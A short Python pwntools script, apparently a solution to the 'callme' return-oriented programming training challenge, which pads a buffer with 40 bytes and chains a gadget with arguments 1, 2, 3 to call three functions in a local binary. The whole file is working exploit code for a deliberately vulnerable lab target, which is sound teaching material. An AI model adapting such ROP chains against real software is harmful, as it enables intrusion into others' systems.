#!/usr/bin/env python2.7
from pwn import *
import os
# binary
challenge="callme"
# payload chunks
padding="A"*40
callme_three=p64(0x0000000000401810)
callme_two=p64(0x0000000000401870)
callme_one=p64(0x0000000000401850)
useful_gadgets=p64(0x0000000000401ab0)
args=p64(1)+p64(2)+p64(3)
# ROP chain
chain=padding+\
	useful_gadgets+args+callme_one+\
	useful_gadgets+args+callme_two+\
	useful_gadgets+args+callme_three
# open and execute the binary. feed it with the rop chain
binary=ELF(os.getcwd()+"/"+challenge)
proc=binary.process()
proc.sendline(chain)
print(proc.recv())